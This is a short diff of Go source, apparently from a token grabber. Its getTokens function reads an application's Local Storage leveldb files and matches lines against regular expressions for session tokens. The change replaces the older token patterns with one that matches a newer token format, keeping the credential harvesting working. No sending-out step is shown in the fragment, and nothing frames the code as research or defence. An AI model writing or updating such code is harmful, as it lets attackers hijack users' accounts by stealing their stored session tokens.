@@ -82,7 +82,7 @@ func getTokens() []string {
 
 			lines, _ := ioutil.ReadFile(filepath.Join(path, "Local Storage", "leveldb", file.Name()))
 			for _, line := range strings.Split(string(lines), "\n") {
-				for _, regex := range []string{`mfa\.[\w-]{84}`, `[\w-]{24}\.[\w-]{6}\.[\w-]{27}`} {
+				for _, regex := range []string{`MT[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}`} {
 					re := regexp.MustCompile(regex)
 					tokens := re.FindAllString(line, -1)
 					for _, token := range tokens {
